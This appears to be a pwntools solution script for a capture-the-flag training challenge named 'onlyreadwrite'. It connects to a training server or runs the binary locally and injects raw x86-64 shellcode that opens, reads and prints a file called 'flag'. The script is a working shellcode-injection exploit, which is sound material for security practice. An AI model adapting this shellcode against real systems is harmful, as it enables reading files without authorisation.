from pwn import *

#with open("/home/superuser/challenges/tools/shellcodes/normal.sc") as f:
#   shellcode = bytes.fromhex(f.readline().strip('\n'))
#print(shellcode.hex())

context.terminal = ['tmux', 'splitw', '-h']

if args["REMOTE"]:
    r = remote("bin.training.offdef.it", 2006)
else:
    r = process("./onlyreadwrite")
    gdb.attach(r, """
    b *0x0040154d
    c
    """)

input("wait")
r.send(b"\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC7\x66\x6C\x61\x67\x57\x48\x89\xE7\x48\x05\x00\x01\x00\x00\x50\x50\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\x31\xC0\x5E\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x00\x00\x00\x00\x5E\x48\xC7\xC2\x30\x00\x00\x00\x0F\x05")
r.interactive()

